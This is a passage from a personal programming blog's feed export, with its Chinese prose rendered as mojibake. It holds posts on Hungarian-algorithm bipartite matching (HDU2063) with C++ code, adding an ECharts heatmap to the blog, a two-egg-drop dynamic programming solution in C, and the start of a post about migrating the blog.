<p>æœ€å¤§åŒ¹é…ï¼š</p>
<p>ç»™å®šäºŒåˆ†å›¾<code>G</code>çš„æ‰€æœ‰å­å›¾ä¸­ï¼Œæ»¡è¶³åŒ¹é…æ¡ä»¶çš„æœ€å¤§è¾¹æ•°å­å›¾</p>
<p>å…³äºæ›´å¤šçš„ç®—æ³•è§£æï¼Œè¯·ç§»æ­¥è‡³<a href="https://www.cnblogs.com/cruelty_angel/p/10808729.html" target="_blank" rel="noopener">è¿™ä½ä½œè€…çš„åšå®¢</a></p>
<h2 id="ç®—æ³•å®ç°"><a href="#ç®—æ³•å®ç°" class="headerlink" title="ç®—æ³•å®ç°"></a>ç®—æ³•å®ç°</h2><h3 id="é¢˜ç›®èƒŒæ™¯"><a href="#é¢˜ç›®èƒŒæ™¯" class="headerlink" title="é¢˜ç›®èƒŒæ™¯"></a>é¢˜ç›®èƒŒæ™¯</h3><p><a href="http://acm.hdu.edu.cn/showproblem.php?pid=2063" target="_blank" rel="noopener">HDU2063è¿‡å±±è½¦</a></p>
<h3 id="é¢˜è§£"><a href="#é¢˜è§£" class="headerlink" title="é¢˜è§£"></a>é¢˜è§£</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAX_NUM 501</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">bool</span> graph[MAX_NUM][MAX_NUM];</span><br><span class="line"><span class="keyword">bool</span> visited[MAX_NUM];</span><br><span class="line"><span class="comment">// å­˜æ”¾æ¯ä¸ªç”·ç”ŸåŒ¹é…çš„å¥³ç”Ÿ</span></span><br><span class="line"><span class="keyword">int</span> matched[MAX_NUM];</span><br><span class="line"><span class="keyword">int</span> girlNum, boyNum;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">matching</span><span class="params">(<span class="keyword">int</span> girl)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> boy = <span class="number">1</span>; boy &lt;= boyNum; boy++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (graph[girl][boy] &amp;&amp; !visited[boy]) &#123;</span><br><span class="line">            visited[boy] = <span class="literal">true</span>;</span><br><span class="line">          	<span class="comment">// å‡è‹¥è¯¥ç”·ç”Ÿæœªè¢«åŒ¹é… æˆ–è€… è¯¥ç”·ç”ŸåŒ¹é…çš„å¥³ç”Ÿ èƒ½å¤Ÿå¯ä»¥æ›´æ¢å…¶ä»–ç”·ç”Ÿ</span></span><br><span class="line">            <span class="keyword">if</span> (matched[boy] == <span class="number">0</span> || matching(matched[boy]) == <span class="number">1</span>) &#123;</span><br><span class="line">                matched[boy] = girl;</span><br><span class="line">                <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">Hungary</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> sum = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> girl = <span class="number">1</span>; girl &lt;= girlNum; girl++) &#123;</span><br><span class="line">        <span class="built_in">memset</span>(visited, <span class="literal">false</span>, <span class="keyword">sizeof</span>(visited));</span><br><span class="line">        sum += matching(girl);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> sum;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> k, girl, boy;</span><br><span class="line">    <span class="keyword">while</span> (~(<span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;k)) &amp;&amp; k) &#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">"%d%d"</span>, &amp;girlNum, &amp;boyNum);</span><br><span class="line">        <span class="built_in">memset</span>(graph, <span class="literal">false</span>, <span class="keyword">sizeof</span>(graph));</span><br><span class="line">        <span class="built_in">memset</span>(matched, <span class="number">0</span>, <span class="keyword">sizeof</span>(matched));</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; k; i++) &#123;</span><br><span class="line">            <span class="built_in">scanf</span>(<span class="string">"%d%d"</span>, &amp;girl, &amp;boy);</span><br><span class="line">            graph[girl][boy] = <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"%d\n"</span>, Hungary());</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>ç®—æ³•</category>
      </categories>
      <tags>
        <tag>C</tag>
        <tag>DFS</tag>
        <tag>åŒˆç‰™åˆ©ç®—æ³•</tag>
      </tags>
  </entry>
  <entry>
    <title>åšå®¢ç³»ç»Ÿå¼•å…¥EChartsçš„æ—¥å†çƒ­åŠ›å›¾</title>
    <url>/2022/01/25/%E5%8D%9A%E5%AE%A2%E7%B3%BB%E7%BB%9F%E5%BC%95%E5%85%A5ECharts%E7%9A%84%E6%97%A5%E5%8E%86%E7%83%AD%E5%8A%9B%E5%9B%BE/</url>
    <content><![CDATA[<p>ä¹‹å‰æˆ‘ä¸€ç›´ä¸­æ„äº<code>Github</code>æˆ–è€…<code>Gitee</code>çš„ä¸ªäººä¸»é¡µä¸­çš„æäº¤è®°å½•çš„ç•Œé¢ï¼Œä¸€ç›´æƒ³åœ¨åšå®¢ç³»ç»Ÿä¸­å¼•å…¥è¿›æ¥ï¼Œå¥ˆä½•ä¹‹å‰ä¸€ç›´æ²¡ç©ºå®ç°ï¼Œè€Œä¸”ä¸çŸ¥é“æœ‰å“ªäº›ç»„ä»¶æˆ–è€…å¼€æºçš„é¡¹ç›®é€‚åˆå€Ÿé‰´ï¼›å‰ä¸ä¹…æ— æ„çœ‹åˆ°<a href="https://echarts.apache.org/zh/index.html" target="_blank" rel="noopener"><code>Echarts</code></a>ä¸­çš„çƒ­åŠ›å›¾å¾ˆç¬¦åˆæˆ‘çš„é¢„æœŸï¼Œå°±æ‹¿äº†è¿‡æ¥ã€‚</p>
<a id="more"></a>

<p>å¾—ç›Šäºå‰åç«¯åˆ†ç¦»æ¨¡å¼ï¼Œæˆ‘ç›´æ¥åœ¨å‰ç«¯ä¸­å¼•å…¥è¯¥ç»„ä»¶ï¼Œåç«¯ä¸éœ€è¦ä¿®æ”¹ä»»ä½•ä¸€è¡Œä»£ç ï¼›ä¸è¿‡å‰ç«¯æˆ‘ä¸å¤ªäº†è§£ï¼ˆå…¶å®åç«¯ä¹Ÿä¸å’‹åœ°ï¼Œhhhhhhhï¼‰ï¼Œè°ƒäº†å¥½ä¹…æ‰å‹‰å‹‰å¼ºå¼ºçœ‹å¾—è¿‡å»ï¼Œå°±è¿™æ ·å§ï¼Œå‰ç«¯å¤ªéš¾äº†å•Šå•Šï¼</p>
<p>ä¹‹å‰å°±äº†è§£è¿‡ä¸€ç‚¹ç‚¹<code>Echarts</code>ï¼Œå¾ˆå–œæ¬¢å®ƒçš„åŠ¨ç”»ï¼Œåé¢é€šè¿‡æŸ¥èµ„æ–™æ‰çŸ¥é“æ˜¯å®ƒæ˜¯ç”±ç™¾åº¦å¼€æºçš„ï¼Œåæ¥æç»™äº† <a href="https://baike.baidu.com/item/Apache/8512995" target="_blank" rel="noopener">Apache</a>åŸºé‡‘ä¼š ï¼Œè¿™è®©æˆ‘ç¨å¾®æ”¹å˜äº†å¯¹ç™¾åº¦çš„çœ‹æ³•ï¼Œåæ­£åœ¨æˆ‘çœ‹æ¥ï¼Œç™¾åº¦è·Ÿé˜¿é‡Œå·´å·´ã€è…¾è®¯ä»–ä»¬æ¯”èµ·æ¥ï¼Œå·®å¤ªå¤šäº†ï¼Œæ——ä¸‹çš„ç½‘ç›˜å‡­å€Ÿç€ç”¨æˆ·é‡å¤§ï¼Œåƒç›¸éš¾çœ‹ï¼Œç™¾åº¦å¼•æ“ä¹Ÿæ˜¯å·®å¾—ä¸å¾—äº†ï¼Œæœä¸ªä¸œè¥¿ï¼Œå¹¿å‘Šå äº†åŠæ•°ï¼Œæ‰‹ä¸Šçš„ç‰Œéƒ½ç»™æ‰“çƒ‚äº†â€¦â€¦æ‰¯è¿œäº†ï¼Œ<code>Echarts</code>çš„æ–‡æ¡£è¿˜æ˜¯å†™å¾—å¾ˆè¯¦ç»†çš„ï¼Œå…³é”®æ˜¯å¸¦ä¸­æ–‡ï¼å¸Œæœ›å›½äº§çš„ä¸œè¥¿è¶Šæ¥è¶Šå¤šï¼Œè¶Šæ¥è¶Šå¥½å§</p>
<p>ä¸è¿‡åœ¨æˆ‘å°è¯•æŠŠä»£ç <code>push</code>åˆ°<code>github</code>ä¸Šé¢çš„æ—¶å€™ï¼Œå°±å‡ºç°äº†é”™è¯¯ï¼Œå…ˆæ˜¯è¯´<code>SSH</code>çš„é—®é¢˜ï¼Œç½‘ä¸ŠæŸ¥äº†ï¼Œå¥½åƒè¯´æ˜¯å› ä¸ºç”µè„‘è¿™è¾¹ä¸ä¿¡ä»»è¯ä¹¦ï¼Œè¿™ä¸ªå‰å‡ å¤©æˆ‘ç”¨<code>chrome</code>æµè§ˆ<code>github</code>æ—¶å€™é‡åˆ°è¿‡äº†ï¼Œä¿®å¤å¥½äº†ï¼Œä½†æ˜¯ä¸çŸ¥é“ä¸ºå•¥<code>git</code>è¿™è¾¹ä¹Ÿä¼šå‡ºé”™ï¼›ç­‰æˆ‘æ”¹å¥½äº†ï¼Œå†å°è¯•çš„æ—¶å€™åˆé‡åˆ°äº†ä¸€ä¸ªé—®é¢˜ï¼Œ</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">remote: Support for password authentication was removed on August 13, 2021. Please use a personal access token instead.</span><br></pre></td></tr></table></figure>

<p>å¥½åƒæ˜¯å› ä¸ºåŸå…ˆçš„å¯†ç å‡­è¯ä»2021å¹´8æœˆ13æ—¥å¼€å§‹å°±ä¸èƒ½ç”¨äº†ï¼Œå¿…é¡»ä½¿ç”¨ä¸ªäººè®¿é—®ä»¤ç‰Œï¼ˆ<code>personal access token</code>ï¼‰ï¼Œæ²¡åŠæ³•ï¼Œå»å¹´è¿™æ®µæ—¶é—´å¿™ç€å¤ä¹ ï¼Œæ²¡æ€ä¹ˆå†™è¿‡ä»£ç ï¼Œæˆ–è€…è¯´æ²¡æ€ä¹ˆç”¨è¿‡<code>git</code>ï¼Œè§£å†³è¿™ä¸ªä¹Ÿå¾ˆç®€å•ï¼Œå°ä¼™ä¼´ä»¬å¯ä»¥å€Ÿé‰´è¿™ä¸ª<a href="https://zhuanlan.zhihu.com/p/401978754" target="_blank" rel="noopener">æµç¨‹</a>.</p>
]]></content>
      <categories>
        <category>åšå®¢</category>
      </categories>
      <tags>
        <tag>Echarts</tag>
        <tag>æ—¥å†çƒ­åŠ›å›¾</tag>
      </tags>
  </entry>
  <entry>
    <title>åŒè›‹é—®é¢˜</title>
    <url>/2020/03/22/%E5%8F%8C%E8%9B%8B%E9%97%AE%E9%A2%98/</url>
    <content><![CDATA[<p>æ˜¨å¤©çœ‹äº†ææ°¸ä¹è€å¸ˆçš„<a href="https://www.bilibili.com/video/av96214853" target="_blank" rel="noopener">è§†é¢‘</a>ï¼Œæƒ³ç€åˆ©ç”¨ç¼–ç¨‹å®ç°ï¼Œæƒ³ç€æƒ³ç€å°±åŠ¨èµ·æ‰‹æ¥äº†ã€‚</p>
<h2 id="é—®é¢˜æè¿°"><a href="#é—®é¢˜æè¿°" class="headerlink" title="é—®é¢˜æè¿°"></a>é—®é¢˜æè¿°</h2><p>ä½ æœ‰ä¸¤ä¸ªé¸¡è›‹ï¼Œæ¥¼å±‚æœ‰ä¸€ç™¾å±‚ï¼Œè¿™åº§æ¥¼æœ‰ä¸€ä¸ª<strong>ä¸´ç•Œç‚¹</strong>ï¼Œå³ä»é«˜äºï¼ˆå«è¯¥æ¥¼å±‚ï¼‰é«˜æ¥¼å±‚å¾€ä¸‹æ‰”é¸¡è›‹ï¼Œé¸¡è›‹ä¼šç¢ï¼Œä½äº</p>
<p>è¯¥æ¥¼å±‚ï¼Œæ— è®ºæ‰”å‡ æ¬¡éƒ½ä¸ä¼šç¢ï¼ˆ~~å¿½ç•¥ç‰©ç†å› ç´ ï¼‰ï¼Œé—®ä½ æœ€å°‘éœ€è¦å°è¯•å‡ æ¬¡ï¼Œ<strong>ä¸€å®š</strong>å¯ä»¥ç¡®å®šè¯¥ä¸´ç•Œæ¥¼å±‚ã€‚<a id="more"></a></p>
<h2 id="è§£æ³•ä¸€"><a href="#è§£æ³•ä¸€" class="headerlink" title="è§£æ³•ä¸€"></a>è§£æ³•ä¸€</h2><p>ä¸€å±‚ä¸€å±‚åœ°å°è¯•ï¼Œæœ€å¥½çš„æƒ…å†µä¸‹åªéœ€ä»ä¸€æ¬¡ï¼Œæœ€åçš„æƒ…å†µæ˜¯100æ¬¡ï¼Œå³ç­”æ¡ˆæ˜¯åœ¨[1,100]ï¼Œå³æœ€ç»ˆç­”æ¡ˆæ˜¯100æ¬¡ã€‚</p>
<h2 id="è§£æ³•äºŒ"><a href="#è§£æ³•äºŒ" class="headerlink" title="è§£æ³•äºŒ"></a>è§£æ³•äºŒ</h2><p>äºŒåˆ†æ³•ï¼Œå³ç¬¬ä¸€ä¸ªé¸¡è›‹æˆ‘ä¸ä»ç¬¬ä¸€å±‚å¼€å§‹ï¼Œæˆ‘ä»ç¬¬50ï¼ˆ100çš„ä¸€åŠï¼‰å±‚å¼€å§‹ï¼Œè¦æ˜¯é¸¡è›‹ç¢äº†ï¼Œä¸´ç•Œæ¥¼å±‚å°±åœ¨[1,50]ä¹‹é—´ï¼Œæ¥ç€ç”¨è§£æ³•ä¸€çš„æ–¹å¼å»å°è¯•ï¼›è¦æ˜¯ä¸ç¢ï¼Œè¯´æ˜ä¸´ç•Œæ¥¼å±‚å°±åœ¨[51,100]ä¹‹é—´ï¼Œç»§ç»­ä»75å±‚å¼€å§‹ï¼Œç„¶ååˆä¼šå‡ºç°ä¸¤ç§æƒ…å†µï¼Œé‡å¤ä¸Šè¿°è¿‡ç¨‹ã€‚å³ç¬¬ä¸€ä¸ªé¸¡è›‹æ˜¯ç”¨äºç¡®å®šåŒºé—´ï¼Œç¬¬äºŒä¸ªé¸¡è›‹æ˜¯ç”¨äºç¡®å®šä¸´ç•Œæ¥¼å±‚ã€‚åœ¨è¿™ç§æƒ…å†µä¸‹æœ€åæƒ…å†µä¸‹éœ€è¦<strong>1+49=50</strong>æ¬¡ï¼Œæœ€å¥½çš„æƒ…å†µæ˜¯<strong>8</strong>æ¬¡ï¼ˆä¾æ¬¡æ‰”çš„æ¥¼å±‚æ˜¯50ï¼Œ75ï¼Œ87ï¼Œ93ï¼Œ96ï¼Œ98ï¼Œ99ï¼Œ100ï¼‰ï¼Œå³ç­”æ¡ˆæ˜¯åœ¨[8,50],æœ€ç»ˆç­”æ¡ˆæ˜¯50.</p>
<h2 id="è§£æ³•ä¸‰"><a href="#è§£æ³•ä¸‰" class="headerlink" title="è§£æ³•ä¸‰"></a>è§£æ³•ä¸‰</h2><p>ç»è¿‡ä¸Šé¢çš„å°è¯•ï¼Œæˆ‘ä»¬å‘ç°ï¼Œæœ€åæƒ…å†µä¸‹å’Œæœ€å¥½æƒ…å†µä¸‹ï¼Œéœ€è¦çš„æ¬¡æ•°è·¨åº¦å¤ªå¤§äº†ï¼Œæˆ‘ä»¬å¯ä»¥ä¸å¯ä»¥å°è¯•ç€ä¸€ç§æ–¹æ¡ˆï¼Œä½¿å¾—æœ€åå’Œæœ€å¥½çš„æƒ…å†µä¸‹ä½¿ç”¨æ¬¡æ•°ç›¸å·®æœ€å°å‘¢ï¼Ÿå¦‚ä½•åšåˆ°ç›¸å·®æœ€å°å‘¢ï¼Ÿé‚£æˆ‘åªè¦ä¸¤ä¸ªé¸¡è›‹æ‰€éœ€æ‰”çš„æ¬¡æ•°ä¹‹å’Œè¶‹å‘äºä¸€ä¸ªå¸¸æ•°ï¼Œå°±å¯ä»¥äº†ã€‚å‡è®¾ç¬¬ä¸€ä¸ªé¸¡è›‹ç¬¬ä¸€æ¬¡åœ¨ç¬¬nå±‚æ‰”ï¼Œå‡å¦‚é¸¡è›‹ç¢äº†ï¼Œç¬¬äºŒä¸ªé¸¡è›‹æœ€åæƒ…å†µéœ€è¦æ‰”n-1æ¬¡ï¼Œæ€»æ¬¡æ•°æ˜¯ï¼ˆ1+n-1ï¼‰æ¬¡ï¼›å‡å¦‚æ²¡ç¢ï¼Œç¬¬ä¸€ä¸ªé¸¡è›‹å°±å¯ä»¥å†é€‰æ‹©ä¸€ä¸ªæ¥¼å±‚æ¥ç¡®å®šåŒºé—´ï¼Œé‚£é€‰å“ªä¸€å±‚å‘¢ï¼Ÿç­”æ¡ˆæ˜¯ç¬¬[n+(n-1)]å±‚ï¼Œå‡å¦‚ç¢äº†ï¼Œç¬¬äºŒä¸ªé¸¡è›‹å°±ä»ç¬¬nå±‚å¼€å§‹å¾€ä¸Šå¯»æ‰¾ç­”æ¡ˆï¼Œæœ€åæƒ…å†µéœ€è¦ä»n-2æ¬¡ï¼Œå³æ€»æ¬¡æ•°æ˜¯[2+(n-2)]æ¬¡ï¼›å‡å¦‚æ²¡ç¢ï¼Œç¬¬ä¸€ä¸ªé¸¡è›‹æ¥ç€ä»ç¬¬[n+(n-1)+(n-2)]å±‚å¼€å§‹æ‰”ï¼Œé‡å¤ä¸Šè¿°è¿‡ç¨‹ï¼Œæœ€åæƒ…å†µä¸‹æ˜¯ï¼šç¬¬ä¸€ä¸ªé¸¡è›‹æ‰”çš„æ¥¼å±‚æ˜¯nï¼Œn-1ï¼Œn-2ï¼Œn-3ï¼Œâ€¦â€¦ï¼Œ1ï¼Œåªéœ€è¦[n+(n-1)+(n-2)+â€¦â€¦+1]&gt;=100ï¼Œå°†æ±‚å¾—çš„nå‘ä¸‹æ±‚æ•´å³å¯ï¼Œæ­¤æ—¶n=14ã€‚å³æœ€ç»ˆç­”æ¡ˆæ˜¯14ï¼Œå³<strong>14æ¬¡å°è¯•ï¼Œä¸€å®šå¯ä»¥ç¡®å®šè¯¥ä¸´ç•Œå€¼ã€‚</strong></p>
<h2 id="æ™®éåŒ–"><a href="#æ™®éåŒ–" class="headerlink" title="æ™®éåŒ–"></a>æ™®éåŒ–</h2><p>å‡å¦‚æ¥¼å±‚æ•°æ˜¯mï¼Œé¸¡è›‹æ•°æ˜¯nå‘¢ï¼Œå¯¹äºæŸä¸€ä¸ªç»„åˆï¼ˆmï¼Œnï¼‰ï¼Œæ€æ ·å¿«é€Ÿåœ°å¾—åˆ°ç­”æ¡ˆå‘¢ï¼Ÿæˆ‘ä»¬å¯ä»¥å…ˆç”»å‡ºä¸€å¼ è¡¨</p>
<table>
<thead>
<tr>
<th>ä¸‹é¢æ˜¯æ¥¼å±‚æ•°mï¼Œå³è¾¹æ˜¯é¸¡è›‹æ•°n</th>
<th>1</th>
<th>2</th>
<th>3</th>
<th>4</th>
<th>5</th>
</tr>
</thead>
<tbody><tr>
<td>1</td>
<td><span color="##ff0000">1</span></td>
<td>1</td>
<td>1</td>
<td>1</td>
<td>1</td>
</tr>
<tr>
<td>2</td>
<td>2</td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>3</td>
<td>3</td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>4</td>
<td>4</td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>5</td>
<td>5</td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>6</td>
<td>6</td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
</tbody></table>
<p>å¯¹äºæœ€å·¦è¾¹å’Œæœ€ä¸Šè¾¹ï¼Œæˆ‘ä»¬å¾ˆå®¹æ˜“å¯ä»¥å¡«å¥½ï¼Œå¯¹äºå…¶ä»–æƒ…å†µå‘¢ï¼Ÿè®¾Tï¼ˆmï¼Œnï¼‰è¡¨ç¤ºæ‹¥æœ‰nä¸ªè›‹ï¼Œéœ€è¦ç¡®å®šmå±‚æ¥¼çš„ä¸´ç•Œå±‚çš„æœ€å°å°è¯•æ¬¡æ•°ã€‚å‡è®¾æ‰‹ä¸Šçš„ç¬¬ä¸€ä¸ªé¸¡è›‹åœ¨ç¬¬kå±‚æ¥¼æ‰”</p>
<ul>
<li>å‡å¦‚ç¢äº†ï¼Œç›¸å½“äºé¸¡è›‹å°‘äº†ï¼Œä¸´ç•Œæ¥¼å±‚åœ¨ç¬¬kå±‚ä¸‹é¢ï¼Œéœ€è¦çš„æ¬¡æ•°å°±æ˜¯{Tï¼ˆk-1ï¼Œn-1ï¼‰+1}</li>
<li>å‡å¦‚ä¸ç¢ï¼Œç›¸å½“äºæ‰‹ä¸Šçš„é¸¡è›‹æ•°æ²¡å˜ï¼Œè€Œä¸”éœ€è¦ç¡®å®šçš„æ¥¼å±‚æ•°ä¹Ÿå‡å°‘äº†ï¼Œç­”æ¡ˆå°±æ˜¯{Tï¼ˆm-kï¼Œnï¼‰+1}</li>
</ul>
<p>å¯¹äºè¿™ä¸¤ç§æƒ…å†µï¼Œè¦ä¹ˆæ˜¯ä½¿å¾—é¸¡è›‹æ•°å‡å°‘äº†ï¼Œè¦ä¹ˆä½¿å¾—æ¥¼å±‚æ•°å‡å°‘äº†ï¼ŒäºŒè€…çš„å–å€¼æœ‰å¯èƒ½ä¸ä¸€æ ·ï¼Œä¸ºäº†ç¡®ä¿ä¸€å®šèƒ½ç¡®å®šå‡ºæ¥ï¼Œæˆ‘ä»¬å–æœ€å¤§å€¼ï¼Œæˆ‘ä»¬è®°ä¸ºT<sub>k</sub> ã€‚é‚£kçš„å–å€¼åˆè¯¥å¦‚ä½•é€‰æ‹©å‘¢ï¼Ÿæˆ‘ä»¬ä¸éš¾å‘ç°ï¼Œkå¯ä»¥ä»<strong>1</strong>å–åˆ°<strong>m</strong>ï¼Œéƒ½ä¼šå¯¹åº”ä¸€ä¸ªT<sub>k</sub> ï¼Œæˆ‘ä»¬åªè¦é€‰å‡ºæœ€å°çš„å€¼å³å¯ã€‚æœ‰åŒå­¦å¯èƒ½ä¼šç–‘é—®ï¼Œä¸Šé¢æ˜¯é€‰æ‹©æœ€å¤§å€¼ï¼Œè¿™é‡Œä¸ºä»€ä¹ˆé€‰æ‹©æœ€å°å€¼å‘¢ï¼Ÿæ˜¯å› ä¸ºè¿™é‡Œçš„kæ˜¯æˆ‘ä»¬è‡ªå·±é€‰æ‹©çš„ï¼Œä½†æ˜¯é€‰å¥½äº†kåï¼Œé¸¡è›‹ç¢ä¸ç¢æˆ‘ä»¬æ— æ³•é¢„æµ‹ï¼Œå› æ­¤ä¸Šé¢é€‰æ‹©æœ€å¤§å€¼ï¼Œè¿™é‡Œé€‰æ‹©æœ€å°å€¼ã€‚å› æ­¤çŠ¶æ€è½¬ç§»æ–¹ç¨‹å°±æ˜¯</p>
<p>Tï¼ˆmï¼Œnï¼‰= min(T<sub>k</sub>  ,k=1,2,3,â€¦â€¦,mï¼ŒT<sub>k</sub>={max[Tï¼ˆmï¼Œn-1ï¼‰,Tï¼ˆm-kï¼Œnï¼‰]+1}</p>
<p>å› æ­¤å¡«è¡¨çš„æ–¹å¼å°±æ˜¯ä»¥åˆ—ä¸ºä¸»åºï¼Œä»ä¸Šå¾€ä¸‹ï¼Œä¸‹é¢ç»™å‡ºä»£ç </p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * @Description:</span></span><br><span class="line"><span class="comment"> * @Author: Yale_Xin</span></span><br><span class="line"><span class="comment"> * @Date: 2020-03-22 15:44:41</span></span><br><span class="line"><span class="comment"> * @LastEditTime: 2020-03-22 15:56:36</span></span><br><span class="line"><span class="comment"> * @LastEditors: Yale_Xin</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> max(a, b) a &gt; b ? a : b</span></span><br><span class="line"><span class="keyword">int</span> T[<span class="number">100</span>][<span class="number">100</span>], egg, <span class="built_in">floor</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> m, n, k;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%d %d"</span>, &amp;<span class="built_in">floor</span>, &amp;egg);</span><br><span class="line">    <span class="comment">//ä¸¤ä¸ªå¾ªç¯ç”¨äºåˆå§‹åŒ–</span></span><br><span class="line">    <span class="keyword">for</span> (m = <span class="number">1</span>; m &lt;= <span class="built_in">floor</span>; m++) &#123;</span><br><span class="line">        T[m][<span class="number">1</span>] = m;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (n = <span class="number">1</span>; n &lt;= egg; n++) &#123;</span><br><span class="line">        T[<span class="number">1</span>][n] = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// å¡«è¡¨å¼€å§‹</span></span><br><span class="line">    <span class="keyword">for</span> (n = <span class="number">2</span>; n &lt;= egg; n++)</span><br><span class="line">        <span class="keyword">for</span> (m = <span class="number">2</span>; m &lt;= <span class="built_in">floor</span>; m++) &#123;</span><br><span class="line">            <span class="keyword">int</span> minTk = <span class="number">32767</span>, Tk;</span><br><span class="line">            <span class="keyword">for</span> (k = <span class="number">1</span>; k &lt;= m; k++) &#123;</span><br><span class="line">                <span class="comment">// è›‹ç¢äº†ï¼Œåˆ™è¿˜éœ€å°è¯•k-1æ¬¡ï¼Œä¸ç¢è¿˜éœ€m-kæ¬¡</span></span><br><span class="line">                Tk = <span class="built_in">max</span>(T[k - <span class="number">1</span>][n - <span class="number">1</span>], T[m - k][n]);</span><br><span class="line">                Tk++;</span><br><span class="line">                minTk = minTk &lt; Tk ? minTk : Tk;</span><br><span class="line">            &#125;</span><br><span class="line">            T[m][n] = minTk;</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>ç®—æ³•</category>
      </categories>
      <tags>
        <tag>åŠ¨æ€è§„åˆ’</tag>
      </tags>
  </entry>
  <entry>
    <title>åšå®¢è½¬ç§»</title>
    <url>/2020/03/26/%E5%8D%9A%E5%AE%A2%E8%BD%AC%E7%A7%BB/</url>
    <content><![CDATA[<p>ç°åœ¨æ˜¯2020å¹´3æœˆ26æ—¥ï¼Œå‰å‡ å¤©æ­å»ºå¥½äº†typechoçš„åšå®¢ï¼ŒæŠŠHexoä¸‹çš„æ–‡ç« å…¨éƒ½è½¬ç§»äº†è¿‡å»ï¼Œæ¥ç€åˆæ˜¯æ¢ä¸»é¢˜ï¼Œå°ä¿®æ”¹ï¼Œç»ˆäºç®—æ˜¯æ»¡æ„äº†ï¼Œæˆ‘ä¸ºä»€ä¹ˆè¦è¿›è¡Œåšå®¢è½¬ç§»ï¼Ÿ</p>
<h2 id="èµ·å› "><a href="#èµ·å› " class="headerlink" title="èµ·å› "></a>èµ·å› <a id="more"></a></h2><p>æœ€è¿‘æ–°å† è‚ºç‚ä¸æ–­è‚†è™å„å›½å„åœ°åŒºï¼Œå„åœ°éƒ½åœ¨ç§¯æé‡‡å–æªæ–½ï¼Œåœ¨è¿™é‡Œæˆ‘è¦æ„Ÿè°¢å¥‹æ–—åœ¨ä¸€çº¿çš„åŒ»ç”ŸæŠ¤å£«ä»¬ï¼Œä½ ä»¬è¾›è‹¦äº†ï¼Œä½ ä»¬æ˜¯æœ€æ£’çš„ï¼é˜¿é‡Œäº‘ä¸ºäº†é¼“åŠ±å¤§å®¶åˆ©ç”¨åœ¨å®¶çš„æ—¶é—´å¤šå¤šå­¦ä¹ ï¼Œæ¨å‡ºäº†<a href="https://developer.aliyun.com/adc/student/" target="_blank" rel="noopener">é«˜æ ¡å­¦ç”Ÿâ€œåœ¨å®¶å®è·µâ€è®¡åˆ’æ´»åŠ¨</a>,ï¼Œåªè¦æ˜¯åœ¨æ ¡å¤§å­¦ç”Ÿï¼Œé€šè¿‡æµ‹è¯•å°±å¯ä»¥é¢†å–å…­ä¸ªæœˆçš„æœåŠ¡å™¨ECSï¼Œ2æ 